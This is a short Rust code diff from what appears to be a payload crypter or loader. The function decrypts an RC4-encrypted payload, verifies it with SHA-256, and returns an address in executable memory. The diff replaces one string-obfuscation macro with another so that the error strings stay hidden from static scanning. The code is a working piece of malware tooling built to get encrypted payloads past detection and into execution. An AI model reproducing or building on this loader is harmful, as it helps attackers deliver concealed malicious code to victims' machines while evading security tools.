@@ -1,14 +1,14 @@
 use crate::alloc_mem::alloc_mem;
+use obfstr::obfstr;
 
 pub unsafe fn decrypt(decoded: &[u8]) -> Result<(usize, usize), String> {
-    use rustcrypt_ct_macros::obf_lit;
     use rc4::{Rc4, StreamCipher, KeyInit};
     use generic_array::{GenericArray, typenum::U32};
     use sha2::{Sha256, Digest};
     let key_len = 32;
     let hash_len = 32;
     if decoded.len() < key_len + hash_len + 1 {
-        return Err(obf_lit!("rc4 payload too short").to_string());
+        return Err(obfstr!("rc4 payload too short").to_string());
     }
     let key = &decoded[0..key_len];
     let hash = &decoded[key_len..key_len + hash_len];
@@ -23,7 +23,7 @@ pub unsafe fn decrypt(decoded: &[u8]) -> Result<(usize, usize), String> {
     hasher.update(buf);
     let calc_hash = hasher.finalize();
     if hash != calc_hash.as_slice() {
-        return Err(obf_lit!("rc4 hash mismatch").to_string());
+        return Err(obfstr!("rc4 hash mismatch").to_string());
     }
     Ok((p as usize, encrypted.len())) // Return executable memory address
 }
